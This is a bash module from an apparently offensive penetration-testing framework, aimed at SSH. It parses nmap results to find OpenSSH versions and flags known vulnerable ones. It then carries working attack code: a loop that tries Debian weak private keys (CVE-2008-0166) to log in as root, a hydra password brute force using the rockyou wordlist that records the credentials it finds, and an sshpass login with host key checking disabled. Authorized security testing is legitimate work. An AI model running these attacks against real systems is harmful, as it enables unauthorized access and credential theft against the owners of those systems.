#!/bin/bash
# modules/ssh.sh - SSH vulnerability detection and exploitation
# Version: 2.0

set -euo pipefail

source "$(dirname "${BASH_SOURCE[0]}")/../lib/utils.sh"

MODULE_NAME="SSH"
MODULE_VERSION="2.0"

function ssh_check_vulnerabilities() {
    local target="$1"
    local scan_dir="$2"
    
    log_info "[$MODULE_NAME] Checking SSH vulnerabilities for: $target"
    
    # Check if SSH port is open
    if ! grep -q "22/tcp.*open.*ssh" "${scan_dir}"/nmap_*.nmap 2>/dev/null; then
        log_info "[$MODULE_NAME] SSH port not open on $target"
        return 0
    fi
    
    local ssh_version=$(grep -oP 'product="OpenSSH" version="\K[^"]+' "${scan_dir}"/nmap_*.xml | head -1)
    
    if [ -z "$ssh_version" ]; then
        log_warning "[$MODULE_NAME] Could not determine SSH version"
        return 0
    fi
    
    log_info "[$MODULE_NAME] SSH version detected: OpenSSH $ssh_version"
    
    # Check for known vulnerable versions
    check_openssh_vulnerabilities "$target" "$ssh_version" "$scan_dir"
}

function check_openssh_vulnerabilities() {
    local target="$1"
    local version="$2"
    local scan_dir="$3"
    
    # OpenSSH 4.7p1 Debian - Weak key vulnerability
    if [[ "$version" == "4.7p1"* ]]; then
        log_warning "[$MODULE_NAME] Potentially vulnerable to Debian weak keys (CVE-2008-0166)"
        
        echo "OpenSSH 4.7p1 - Debian weak keys vulnerability" >> "${scan_dir}/vulnerabilities.txt"
        echo "CVE-2008-0166" >> "${scan_dir}/cves.txt"
        
        # Optionally attempt weak key attack
        if [ "${CONFIG_BRUTEFORCE_ENABLED:-false}" = "true" ]; then
            ssh_weak_key_attack "$target" "$scan_dir"
        fi
    fi
    
    # Check for other vulnerable versions
    case "$version" in
        "2.9p2"|"3.9p2")
            log_warning "[$MODULE_NAME] Very old SSH version - likely vulnerable"
            echo "OpenSSH $version - Multiple vulnerabilities" >> "${scan_dir}/vulnerabilities.txt"
            ;;
    esac
}

function ssh_weak_key_attack() {
    local target="$1"
    local scan_dir="$2"
    
    log_info "[$MODULE_NAME] Checking for Debian weak keys..."
    
    local weak_keys_dir="/opt/hackerEnv/exploits/ssh/rsa"
    
    if [ ! -d "$weak_keys_dir" ]; then
        log_warning "[$MODULE_NAME] Weak keys directory not found: $weak_keys_dir"
        log_info "[$MODULE_NAME] Download with: wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/5622.tar.bz2"
        return 1
    fi
    
    log_info "[$MODULE_NAME] Testing weak keys against $target..."
    
    local found_keys=0
    for keyfile in "$weak_keys_dir"/*.pub; do
        [ -f "$keyfile" ] || continue
        
        local private_key="${keyfile%.pub}"
        if ssh -o BatchMode=yes -o ConnectTimeout=5 -i "$private_key" root@"$target" "echo 'success'" 2>/dev/null; then
            log_success "[$MODULE_NAME] WEAK KEY FOUND: $private_key"
            echo "$private_key" >> "${scan_dir}/ssh_weak_keys_found.txt"
            found_keys=$((found_keys + 1))
        fi
    done
    
    if [ $found_keys -gt 0 ]; then
        log_success "[$MODULE_NAME] Found $found_keys weak keys for $target"
    else
        log_info "[$MODULE_NAME] No weak keys found"
    fi
}

function ssh_bruteforce() {
    local target="$1"
    local scan_dir="$2"
    
    if [ "${CONFIG_BRUTEFORCE_ENABLED:-false}" != "true" ]; then
        log_info "[$MODULE_NAME] Bruteforce disabled in configuration"
        return 0
    fi
    
    if ! command -v hydra &> /dev/null; then
        log_warning "[$MODULE_NAME] Hydra not installed - skipping bruteforce"
        return 1
    fi
    
    log_warning "[$MODULE_NAME] Starting SSH password bruteforce on: $target"
    
    local userlist="${CONFIG_USERLIST:-/usr/share/ncrack/default.usr}"
    local wordlist="${CONFIG_WORDLIST:-/usr/share/wordlists/rockyou.txt}"
    local max_attempts="${CONFIG_MAX_ATTEMPTS:-1000}"
    
    if [ ! -f "$wordlist" ]; then
        log_error "[$MODULE_NAME] Wordlist not found: $wordlist"
        return 1
    fi
    
    local output_file="${scan_dir}/ssh_bruteforce.txt"
    
    log_debug "[$MODULE_NAME] hydra -L $userlist -P $wordlist -e nsr -t 4 -w 30 ssh://$target"
    
    # Run hydra with proper timeout and thread limit
    timeout 600 hydra \
        -L "$userlist" \
        -P "$wordlist" \
        -e nsr \
        -t 4 \
        -w 30 \
        -o "$output_file" \
        "ssh://$target" 2>&1 | tee -a "$LOG_FILE" || true
    
    # Parse results
    if [ -f "$output_file" ]; then
        if grep -q "login:" "$output_file"; then
            log_success "[$MODULE_NAME] SSH credentials found!"
            grep "login:" "$output_file" | while read -r line; do
                local username=$(echo "$line" | grep -oP 'login: \K[^ ]+')
                local password=$(echo "$line" | grep -oP 'password: \K[^ ]+')
                log_success "[$MODULE_NAME] Username: $username Password: $password"
                
                # Save credentials
                echo "$username:$password" >> "${scan_dir}/ssh_credentials.txt"
            done
        else
            log_info "[$MODULE_NAME] No credentials found via bruteforce"
        fi
    fi
}

function ssh_connect() {
    local target="$1"
    local username="$2"
    local password="$3"
    
    log_info "[$MODULE_NAME] Attempting SSH connection to $target as $username"
    
    # Use sshpass if available
    if command -v sshpass &> /dev/null; then
        sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username@$target"
    else
        log_warning "[$MODULE_NAME] sshpass not installed - manual login required"
        log_info "[$MODULE_NAME] ssh $username@$target (password: $password)"
    fi
}

function ssh_module_main() {
    local target="$1"
    local scan_dir="$2"
    
    log_info "[$MODULE_NAME] Starting SSH module for: $target"
    
    safe_create_dir "$scan_dir"
    
    # Check for vulnerabilities
    ssh_check_vulnerabilities "$target" "$scan_dir"
    
    # Attempt bruteforce if enabled
    if [ "${CONFIG_BRUTEFORCE_ENABLED:-false}" = "true" ]; then
        ssh_bruteforce "$target" "$scan_dir"
    fi
    
    log_info "[$MODULE_NAME] SSH module completed for: $target"
}

export -f ssh_check_vulnerabilities ssh_weak_key_attack ssh_bruteforce
export -f ssh_connect ssh_module_main
